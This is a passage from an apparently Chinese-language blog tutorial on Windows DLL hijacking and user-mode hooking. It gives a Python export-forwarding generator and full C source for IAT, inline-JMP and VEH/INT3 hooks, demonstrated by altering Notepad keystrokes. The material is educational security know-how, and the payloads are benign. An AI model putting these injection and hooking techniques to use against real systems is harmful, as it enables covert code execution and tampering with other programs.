class="string">&quot;.dll&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(def_file, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">f&#x27;LIBRARY <span class="subst">&#123;target_dll&#125;</span>\nEXPORTS\n&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(pe, <span class="string">&#x27;DIRECTORY_ENTRY_EXPORT&#x27;</span>):</span><br><span class="line">        <span class="keyword">for</span> export <span class="keyword">in</span> pe.DIRECTORY_ENTRY_EXPORT.symbols:</span><br><span class="line">            <span class="keyword">if</span> export.name:</span><br><span class="line">                func_name = export.name.decode()</span><br><span class="line">                <span class="comment"># 格式: 导出函数名 = 转发模块.原函数名 @序号</span></span><br><span class="line">                line = <span class="string">f&quot;<span class="subst">&#123;func_name&#125;</span>=<span class="subst">&#123;forward_module&#125;</span>.<span class="subst">&#123;func_name&#125;</span>\t@<span class="subst">&#123;export.ordinal&#125;</span>&quot;</span></span><br><span class="line">                file.write(<span class="string">&quot;\t&quot;</span> + line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span> </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] No export table found!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Done! Generated <span class="subst">&#123;count&#125;</span> exports.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Compile command: gcc -shared my_hack.c <span class="subst">&#123;def_file&#125;</span> -o <span class="subst">&#123;target_dll&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>使用 <code>gcc -shared -o payload.dll payload.c payload.def</code>进行编译</p>
<p><img src="/image/2025-12-12-windows_dll_injection/1765845870344.png" alt="1765845870344"></p>
<h3 id="攻击效果-3"><a href="#攻击效果-3" class="headerlink" title="攻击效果"></a>攻击效果</h3><p><img src="/image/2025-12-12-windows_dll_injection/1765691259175.png" alt="1765691259175"></p>
<p><img src="/image/2025-12-12-windows_dll_injection/1765691304640.png" alt="1765691304640"></p>
<h2 id="windows-hook-R3"><a href="#windows-hook-R3" class="headerlink" title="windows hook-R3"></a>windows hook-R3</h2><p>Hook（钩子）技术的核心在于截获软件执行流或消息流，在目标函数执行前、执行中或执行后插入自定义逻辑。根据介入层级和实现方式的不同，可以分为应用层 Hook（Ring 3）、调试型 Hook 、底层虚拟化 Hook（Ring -1）以及内核Hook（Ring 0）。</p>
<p><img src="/image/2025-12-12-windows_dll_injection/1765691353434.png" alt="1765691353434"></p>
<h3 id="基于导入表的-Hook-IAT-Hook"><a href="#基于导入表的-Hook-IAT-Hook" class="headerlink" title="基于导入表的 Hook (IAT Hook)"></a>基于导入表的 Hook (IAT Hook)</h3><p>IAT Hook 通过修改 IAT 表中目标函数的地址，将其替换为恶意 Hook 函数的地址。当程序下次“查表”调用该函数时，就会跳转到恶意代码。</p>
<h4 id="实现方法-2"><a href="#实现方法-2" class="headerlink" title="实现方法"></a>实现方法</h4><p><strong>定位导入表</strong> ：从 DOS 头 -&gt; NT 头 -&gt; 可选头 -&gt; 数据目录中找到  <strong>导入表 (Import Directory)</strong> 。</p>
<p><strong>定位目标 DLL</strong> ：遍历导入描述符 (<code>IMAGE_IMPORT_DESCRIPTOR</code>)，找到目标 DLL（如 <code>user32.dll</code>）</p>
<p><strong>双桥遍历</strong> ：同时遍历 <strong>OriginalFirstThunk (INT)</strong> 和  <strong>FirstThunk (IAT)</strong> 。</p>
<ul>
<li><code>OriginalFirstThunk</code> 保存函数 <strong>名称</strong> ，永远不会改变，用于匹配目标函数名（如 “DispatchMessageW”）。</li>
<li><code>FirstThunk</code> 保存函数 <strong>地址</strong> ，用于实施修改。</li>
</ul>
<p><img src="/image/2025-12-12-windows_dll_injection/1765846796434.png" alt="1765846796434"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 编译命令: gcc -shared -o IATHook_DualBridge.dll IATHook_DualBridge.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 MessageBoxW 函数指针类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">LRESULT</span> <span class="params">(WINAPI *PDispatchMessageW)</span><span class="params">(CONST MSG *lpMsg)</span>;</span><br><span class="line">PDispatchMessageW pOriginalDispatchMessageW = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">LRESULT WINAPI <span class="title function_">MyDispatchMessageW</span><span class="params">(CONST MSG *lpMsg)</span> &#123;</span><br><span class="line">    <span class="comment">// 检查是否是字符消息 (WM_CHAR = 0x0102)</span></span><br><span class="line">    <span class="keyword">if</span> (lpMsg-&gt;message == WM_CHAR) &#123;</span><br><span class="line">        <span class="type">wchar_t</span> ch = (<span class="type">wchar_t</span>)lpMsg-&gt;wParam; <span class="comment">// wParam 存放的就是字符的 ASCII/Unicode 码</span></span><br><span class="line">        <span class="keyword">if</span>(((MSG*)lpMsg)-&gt;wParam==<span class="string">&#x27;a&#x27;</span>)((MSG*)lpMsg)-&gt;wParam = <span class="string">&#x27;b&#x27;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 继续调用原函数，让 Notepad 正常处理</span></span><br><span class="line">    <span class="keyword">return</span> pOriginalDispatchMessageW(lpMsg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">StartIATHook</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 获取当前模块基址 (注入后即为 Notepad.exe 的基址)</span></span><br><span class="line">    HMODULE hModule = GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 2. 获取 DOS 头和 NT 头</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;</span><br><span class="line">    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">// 3. 获取导入表目录</span></span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModule + </span><br><span class="line">        pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br><span class="line">    <span class="comment">// 4. 遍历导入表寻找 user32.dll</span></span><br><span class="line">    <span class="keyword">while</span> (pImportDesc-&gt;Name) &#123;</span><br><span class="line">        <span class="type">char</span>* pszDllName = (<span class="type">char</span>*)((BYTE*)hModule + pImportDesc-&gt;Name);</span><br><span class="line">        <span class="keyword">if</span> (_stricmp(pszDllName, <span class="string">&quot;user32.dll&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 桥1: OriginalFirstThunk (INT) - 用于查找函数名 [cite: 22]</span></span><br><span class="line">            PIMAGE_THUNK_DATA pOriginalThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + pImportDesc-&gt;OriginalFirstThunk);</span><br><span class="line">            <span class="comment">// 桥2: FirstThunk (IAT) - 用于修改函数地址 [cite: 23]</span></span><br><span class="line">            PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + pImportDesc-&gt;FirstThunk);</span><br><span class="line">            <span class="comment">// 同时遍历两个数组，索引是同步的</span></span><br><span class="line">            <span class="keyword">while</span> (pOriginalThunk-&gt;u1.AddressOfData) &#123;</span><br><span class="line">                <span class="comment">// 检查是否通过名称导入 (最高位不是1)</span></span><br><span class="line">                <span class="comment">// IMAGE_ORDINAL_FLAG 在64位下是高位判断，防止读取序号出错</span></span><br><span class="line">                <span class="keyword">if</span> (!(pOriginalThunk-&gt;u1.Ordinal &amp; IMAGE_ORDINAL_FLAG)) &#123;</span><br><span class="line">                    <span class="comment">// 通过 OriginalThunk 获取函数名结构</span></span><br><span class="line">                    PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)hModule + pOriginalThunk-&gt;u1.AddressOfData);</span><br><span class="line">                    <span class="comment">// 比对函数名</span></span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(pImportByName-&gt;Name, <span class="string">&quot;DispatchMessageW&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="comment">// 1. 保存旧地址 (从 FirstThunk 里读)</span></span><br><span class="line">                        pOriginalDispatchMessageW = (PDispatchMessageW)pFirstThunk-&gt;u1.Function;</span><br><span class="line">                        <span class="comment">// 2. 修改内存保护属性</span></span><br><span class="line">                        DWORD dwOldProtect;</span><br><span class="line">                        VirtualProtect(&amp;pFirstThunk-&gt;u1.Function, <span class="keyword">sizeof</span>(LPVOID), PAGE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">                        <span class="comment">// 3. 修改 IAT，指向我们的函数 [cite: 27]</span></span><br><span class="line">                        <span class="comment">// 注意：这里修改的是 FirstThunk，不是 OriginalThunk</span></span><br><span class="line">                        pFirstThunk-&gt;u1.Function = (ULONG_PTR)MyDispatchMessageW;</span><br><span class="line">                        <span class="comment">// 4. 恢复保护</span></span><br><span class="line">                        VirtualProtect(&amp;pFirstThunk-&gt;u1.Function, <span class="keyword">sizeof</span>(LPVOID), dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                pOriginalThunk++;</span><br><span class="line">                pFirstThunk++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        pImportDesc++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DLL 入口点</span></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (fdwReason) &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        StartIATHook();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="攻击效果-4"><a href="#攻击效果-4" class="headerlink" title="攻击效果"></a>攻击效果</h4><p>所有输入的 <code>a</code>都变成了 <code>b</code></p>
<p><img src="/image/2025-12-12-windows_dll_injection/1765703026493.png" alt="1765703026493"></p>
<h3 id="基于代码的内联-Hook-Inline-Hook"><a href="#基于代码的内联-Hook-Inline-Hook" class="headerlink" title="基于代码的内联 Hook (Inline Hook)"></a>基于代码的内联 Hook (Inline Hook)</h3><p>Inline Hook 的本质是“劫持”函数入口。<br>它不依赖 PE 结构，而是直接修改目标函数在内存中的 <strong>机器码</strong> 。通常是在函数开头写入一条<strong>JMP</strong>指令。当 CPU 执行到该函数时，立即被强制跳转到 Hook 函数。</p>
<h4 id="实现方法-3"><a href="#实现方法-3" class="headerlink" title="实现方法"></a>实现方法</h4><p><code>GetProcAddress</code> ：直接获取目标函数的内存地址，无需解析 PE。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 编译命令: gcc -shared -o InlineHookDll.dll InlineHookDll.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 DispatchMessageW 函数指针类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">LRESULT</span> <span class="params">(WINAPI *PDispatchMessageW)</span><span class="params">(CONST MSG *lpMsg)</span>;</span><br><span class="line"></span><br><span class="line">PDispatchMessageW g_pOriginalDispatchMessageW = <span class="literal">NULL</span>;</span><br><span class="line">BYTE g_OriginalBytes[<span class="number">14</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">// 用于保存函数原本的前14个字节</span></span><br><span class="line">BYTE g_PatchBytes[<span class="number">14</span>] = &#123; <span class="number">0</span> &#125;;    <span class="comment">// 用于保存我们要写入的 JMP 指令</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHook</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">UninstallHook</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">LRESULT WINAPI <span class="title function_">MyDispatchMessageW</span><span class="params">(CONST MSG *lpMsg)</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// [关键步骤 A] 暂时脱钩 (恢复原始代码)</span></span><br><span class="line">    <span class="comment">// 为什么要恢复？因为我们等下要调用原函数。如果不恢复，</span></span><br><span class="line">    <span class="comment">// 调用原函数时又会遇到 JMP 指令跳回这里，导致死循环 (Stack Overflow)。</span></span><br><span class="line">    UninstallHook();</span><br><span class="line">    <span class="keyword">if</span> (lpMsg-&gt;message == WM_CHAR) &#123;</span><br><span class="line">        <span class="keyword">if</span> (lpMsg-&gt;wParam == <span class="string">&#x27;a&#x27;</span>) &#123;</span><br><span class="line">            ((MSG*)lpMsg)-&gt;wParam = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [关键步骤 C] 调用原函数 (此时原函数已恢复正常)</span></span><br><span class="line">    LRESULT result = g_pOriginalDispatchMessageW(lpMsg);</span><br><span class="line">    <span class="comment">// [关键步骤 D] 重新挂钩</span></span><br><span class="line">    <span class="comment">// 原函数执行完了，赶紧把钩子挂回去，拦截下一次消息</span></span><br><span class="line">    InstallHook();</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHook</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (g_pOriginalDispatchMessageW == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    <span class="comment">// 修改内存权限为可读可写可执行 (User32的代码段通常是只读的) [cite: 32]</span></span><br><span class="line">    VirtualProtect(g_pOriginalDispatchMessageW, <span class="number">14</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">    <span class="comment">// 写入我们要构造好的 JMP 指令</span></span><br><span class="line">    <span class="comment">// 效果：只要 CPU 执行到 DispatchMessageW 开头，就直接跳到 MyDispatchMessageW</span></span><br><span class="line">    <span class="built_in">memcpy</span>(g_pOriginalDispatchMessageW, g_PatchBytes, <span class="number">14</span>);</span><br><span class="line">    <span class="comment">// 恢复内存权限</span></span><br><span class="line">    VirtualProtect(g_pOriginalDispatchMessageW, <span class="number">14</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">UninstallHook</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (g_pOriginalDispatchMessageW == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    VirtualProtect(g_pOriginalDispatchMessageW, <span class="number">14</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">    <span class="comment">// 把备份的最原始的字节写回去</span></span><br><span class="line">    <span class="built_in">memcpy</span>(g_pOriginalDispatchMessageW, g_OriginalBytes, <span class="number">14</span>);</span><br><span class="line">    VirtualProtect(g_pOriginalDispatchMessageW, <span class="number">14</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitHook</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 获取 DispatchMessageW 的真实地址</span></span><br><span class="line">    HMODULE hUser32 = GetModuleHandleW(<span class="string">L&quot;user32.dll&quot;</span>);</span><br><span class="line">    g_pOriginalDispatchMessageW = (PDispatchMessageW)GetProcAddress(hUser32, <span class="string">&quot;DispatchMessageW&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!g_pOriginalDispatchMessageW) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(g_OriginalBytes, g_pOriginalDispatchMessageW, <span class="number">14</span>);</span><br><span class="line">    <span class="comment">// 2. 构造 64位 的绝对跳转指令 (JMP [RIP+0])</span></span><br><span class="line">    <span class="comment">// 指令机器码: FF 25 00 00 00 00 (6字节) + 8字节的目标地址</span></span><br><span class="line">    <span class="comment">// 0xFF 0x25 是 JMP [RIP+offset]</span></span><br><span class="line">    g_PatchBytes[<span class="number">0</span>] = <span class="number">0xFF</span>;</span><br><span class="line">    g_PatchBytes[<span class="number">1</span>] = <span class="number">0x25</span>;</span><br><span class="line">    g_PatchBytes[<span class="number">2</span>] = <span class="number">0x00</span>;</span><br><span class="line">    g_PatchBytes[<span class="number">3</span>] = <span class="number">0x00</span>;</span><br><span class="line">    g_PatchBytes[<span class="number">4</span>] = <span class="number">0x00</span>;</span><br><span class="line">    g_PatchBytes[<span class="number">5</span>] = <span class="number">0x00</span>;</span><br><span class="line">    <span class="comment">// 接下来的 8 个字节填入我们的函数 MyDispatchMessageW 的内存地址</span></span><br><span class="line">    *(ULONG_PTR*)(&amp;g_PatchBytes[<span class="number">6</span>]) = (ULONG_PTR)MyDispatchMessageW;</span><br><span class="line">    <span class="comment">// 3. 正式挂钩</span></span><br><span class="line">    InstallHook();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (fdwReason) &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        InitHook(); </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        UninstallHook(); </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="热补丁-Hook-HotFix-Hook"><a href="#热补丁-Hook-HotFix-Hook" class="headerlink" title="热补丁 Hook (HotFix Hook)"></a>热补丁 Hook (HotFix Hook)</h3><p>它利用了 Windows API（主要在 32 位下）特有的函数头结构：</p>
<ol>
<li>函数开头是 2 字节的无用指令 <code>MOV EDI, EDI</code>。</li>
<li>函数上方有 5 字节的空白区 (<code>NOP</code> 或 <code>INT 3</code>)。<br>原理是将开头的 2 字节改为“短跳转（跳到上方）”，在上方写入“长跳转（跳到 Hook 函数）”。</li>
</ol>
<p>本质和Inline Hook都是更改函数入口处的机器码</p>
<h3 id="软件断点-Hook-Int-3-Hook"><a href="#软件断点-Hook-Int-3-Hook" class="headerlink" title="软件断点 Hook (Int 3 Hook)"></a>软件断点 Hook (Int 3 Hook)</h3><p>Int 3 Hook 利用 CPU 的异常处理机制。<br>它将目标函数的第一字节替换为 <code>0xCC</code> (汇编指令  <strong>INT 3</strong> )。当 CPU 执行到这里时，会暂停并抛出 <strong><code>EXCEPTION_BREAKPOINT</code></strong> 异常。通过注册异常处理程序（VEH），可以捕获这个异常并执行自定义逻辑。</p>
<p>中断hook都得关闭kernel debug：<code>bcdedit /debug off</code></p>
<h4 id="实现方法-4"><a href="#实现方法-4" class="headerlink" title="实现方法"></a>实现方法</h4><p><strong><code>AddVectoredExceptionHandler (VEH)</code></strong> ：注册一个全局异常处理函数，用来捕获 <code>0xCC</code> 触发的异常。相比 SEH，VEH 优先级更高且作用于全进程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标函数指针</span></span><br><span class="line"><span class="type">void</span>* g_pTargetFunc = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// 保存原始字节</span></span><br><span class="line">BYTE g_OriginalByte = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 标记是否已经 Hook</span></span><br><span class="line">BOOL g_bIsHooked = FALSE;</span><br><span class="line"><span class="comment">// 我们的处理逻辑</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">MyHookHandler</span><span class="params">()</span> &#123;</span><br><span class="line">    MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;INT 3 Hook Triggered via VEH!&quot;</span>, <span class="string">&quot;Hacked&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// VEH 异常处理函数</span></span><br><span class="line">LONG WINAPI <span class="title function_">MyVEHHandler</span><span class="params">(PEXCEPTION_POINTERS pExceptionInfo)</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 判断是否是断点异常 (0x80000003) 且地址是我们 Hook 的地址</span></span><br><span class="line">    <span class="keyword">if</span> (pExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_BREAKPOINT &amp;&amp;</span><br><span class="line">        pExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionAddress == g_pTargetFunc) &#123;</span><br><span class="line">        <span class="comment">// 2. 执行我们的恶意逻辑</span></span><br><span class="line">        MyHookHandler();</span><br><span class="line">        <span class="comment">// 3 恢复原始字节 (去掉 0xCC)</span></span><br><span class="line">        DWORD dwOld;</span><br><span class="line">        VirtualProtect(g_pTargetFunc, <span class="number">1</span>, PAGE_EXECUTE_READWRITE, &amp;dwOld);</span><br><span class="line">        <span class="built_in">memcpy</span>(g_pTargetFunc, &amp;g_OriginalByte, <span class="number">1</span>);</span><br><span class="line">        VirtualProtect(g_pTargetFunc, <span class="number">1</span>, dwOld, &amp;dwOld);  </span><br><span class="line">        <span class="comment">// 4.将EIP/RIP 指针倒退 1 个字节</span></span><br><span class="line">        <span class="comment">// 因为 CPU 执行了 INT 3 后，指令指针已经指向了下一个字节，我们需要退回去重新执行原指令</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">        pExceptionInfo-&gt;ContextRecord-&gt;Rip--;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        pExceptionInfo-&gt;ContextRecord-&gt;Eip--;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>   </span></span><br><span class="line">        <span class="comment">// 注意：这种简单的 Hook 是一次性的。</span></span><br><span class="line">        <span class="comment">// 如果想持续 Hook，需要在这里设置单步调试 (EFLAGS -&gt; TF位)，</span></span><br><span class="line">        <span class="comment">// 在单步异常中再次写入 0xCC。为简化代码，这里只演示触发一次。</span></span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallInt3Hook</span><span class="params">()</span> &#123;</span><br><span class="line">    HMODULE hUser32 = GetModuleHandleA(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    g_pTargetFunc = (<span class="type">void</span>*)GetProcAddress(hUser32, <span class="string">&quot;MessageBoxW&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!g_pTargetFunc) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 1. 注册全局向量化异常处理程序 (VEH)</span></span><br><span class="line">    <span class="comment">// 参数 1 表示添加到链表头部，优先处理</span></span><br><span class="line">    AddVectoredExceptionHandler(<span class="number">1</span>, MyVEHHandler);</span><br><span class="line">    <span class="comment">// 2. 备份原字节</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;g_OriginalByte, g_pTargetFunc, <span class="number">1</span>);</span><br><span class="line">    <span 